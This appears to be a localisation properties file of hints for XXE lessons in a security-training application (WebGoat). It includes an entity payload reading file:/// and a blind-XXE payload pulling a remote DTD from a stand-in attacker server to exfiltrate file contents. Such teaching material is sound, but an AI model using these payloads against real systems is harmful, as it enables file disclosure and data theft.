xxe.hints.simple.xxe.1=Try submitting the form and see what happens
xxe.hints.simple.xxe.2=Use ZAP/Burp to intercept the request and try to include your own DTD
xxe.hints.simple.xxe.3=Try to include a doctype "(&lt;!DOCTYPE...)" in the xml
xxe.hints.simple.xxe.4=The include can be as follows: &lt;!DOCTYPE user [&lt;!ENTITY root SYSTEM "file:///"&gt; ]>

xxe.hints.content.type.xxe.2=Does the endpoint only accept json messages?

xxe.blind.hints.1=This assignment is more complicated you need to upload the contents of a file to the attackers site (WebWolf in this case)
xxe.blind.hints.2=In this case you cannot combine external entities in combination with internal entities.
xxe.blind.hints.3=Use parameter entities to perform the attack, see for example: https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/
xxe.blind.hints.4=An example DTD can be found here WebGoat/images/example.dtd, include this DTD in the xml comment
xxe.blind.hints.5=Use for the comment, be aware to replace the url accordingly: &lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY % remote SYSTEM "http://localhost:9090/files/test1234/test.dtd"&gt;%remote;]&gt;&lt;comment&gt;&lt;text&gt;test&send;&lt;/text&gt;&lt;/comment&gt;
